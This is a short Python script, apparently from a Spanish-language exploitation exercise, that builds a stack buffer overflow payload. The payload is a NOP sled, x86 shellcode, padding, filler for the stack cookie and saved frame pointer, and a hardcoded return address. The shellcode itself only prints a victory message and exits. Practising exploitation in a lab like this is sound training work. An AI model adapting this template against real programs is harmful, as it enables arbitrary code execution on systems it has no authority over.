from struct import pack

shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x11\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\xc2\xa1\x47\x61\x6e\x61\x73\x74\x65\x20\x45\x74\x68\x61\x6e\x21\x0b"

ret_addr = 0xbffff5c4

output = "\x90" * 20 # nops iniciales buf
output += shellcode # shellcode
output += "A" * (80 - 20 - len(shellcode)) # padding hasta fin de buf
output += "BBBB" # lleno cookie
output += "CCCC" # lleno ebp
output += pack("<I", ret_addr)

print(output)